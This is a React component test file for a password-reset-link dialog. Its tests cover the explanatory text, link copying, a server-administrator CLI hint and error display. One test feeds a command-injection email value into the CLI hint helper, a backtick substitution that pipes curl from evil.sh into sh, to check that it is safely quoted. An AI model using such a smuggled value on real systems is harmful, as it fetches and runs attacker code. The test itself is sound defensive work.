import { fireEvent, render, screen, waitFor } from '@testing-library/react'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import i18n from '@/i18n'
import type { Member } from './types'

const mocks = vi.hoisted(() => ({ post: vi.fn() }))
vi.mock('@/lib/axios', () => ({ default: { post: mocks.post } }))

import { PasswordResetLinkDialog, resetPasswordCommand } from './PasswordResetLinkDialog'

const member: Member = {
  id: 'm2',
  userId: 'u2',
  email: 'bob@example.com',
  firstName: 'Bob',
  lastName: 'Builder',
  role: 'MEMBER',
  joinedAt: '',
}
const URL = 'http://localhost:3000/reset-password?token=abc'

describe('PasswordResetLinkDialog', () => {
  const writeText = vi.fn(() => Promise.resolve())

  beforeEach(async () => {
    await i18n.changeLanguage('en')
    mocks.post.mockReset()
    writeText.mockClear()
    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
  })

  it('explains the link before creating it, then shows and copies it', async () => {
    mocks.post.mockResolvedValueOnce({ data: { resetUrl: URL, expiresAt: '2026-11-09T16:00:00.000Z' } })
    render(<PasswordResetLinkDialog orgId="o1" member={member} onClose={() => {}} />)

    expect(screen.getByText(/valid for 1 hour and can be used once/i)).toBeInTheDocument()
    expect(screen.getByText(/all existing sessions of Bob Builder end/i)).toBeInTheDocument()
    expect(screen.getByText(/share the link personally/i)).toBeInTheDocument()
    expect(mocks.post).not.toHaveBeenCalled()

    fireEvent.click(screen.getByRole('button', { name: /create link/i }))

    const link = await screen.findByLabelText('Reset link')
    expect(link).toHaveValue(URL)
    expect(mocks.post).toHaveBeenCalledWith('/organizations/o1/members/u2/password-reset-link')
    expect(screen.getByText(/valid until/i)).toBeInTheDocument()

    fireEvent.click(screen.getByRole('button', { name: /copy/i }))
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(URL))
  })

  it('points to the server administrator and the CLI when the owner may not reset', async () => {
    mocks.post.mockRejectedValueOnce({
      isAxiosError: true,
      response: {
        status: 403,
        data: {
          message: 'User also belongs to other organizations – ask the server administrator',
          code: 'RESET_REQUIRES_SERVER_ADMIN',
        },
      },
    })
    render(<PasswordResetLinkDialog orgId="o1" member={member} onClose={() => {}} />)
    fireEvent.click(screen.getByRole('button', { name: /create link/i }))

    const hint = await screen.findByTestId('server-admin-hint')
    expect(hint).toHaveTextContent(/only the server administrator/i)
    expect(hint).toHaveTextContent(/other organizations/i)
    expect(hint.querySelector('code')).toHaveTextContent(
      "docker exec -it togglely-backend node dist/cli reset-password 'bob@example.com'"
    )
  })

  it('quotes shell metacharacters in the CLI hint email', () => {
    expect(resetPasswordCommand('`curl${IFS}evil.sh|sh`@x.com')).toBe(
      "docker exec -it togglely-backend node dist/cli reset-password '`curl${IFS}evil.sh|sh`@x.com'"
    )
    expect(resetPasswordCommand("a'b@x.com")).toBe(
      "docker exec -it togglely-backend node dist/cli reset-password 'a'\\''b@x.com'"
    )
  })

  it('shows other errors in the dialog', async () => {
    mocks.post.mockRejectedValueOnce({
      isAxiosError: true,
      response: { status: 400, data: { message: 'User account is deactivated' } },
    })
    render(<PasswordResetLinkDialog orgId="o1" member={member} onClose={() => {}} />)
    fireEvent.click(screen.getByRole('button', { name: /create link/i }))
    expect(await screen.findByRole('alert')).toHaveTextContent('User account is deactivated')
  })
})
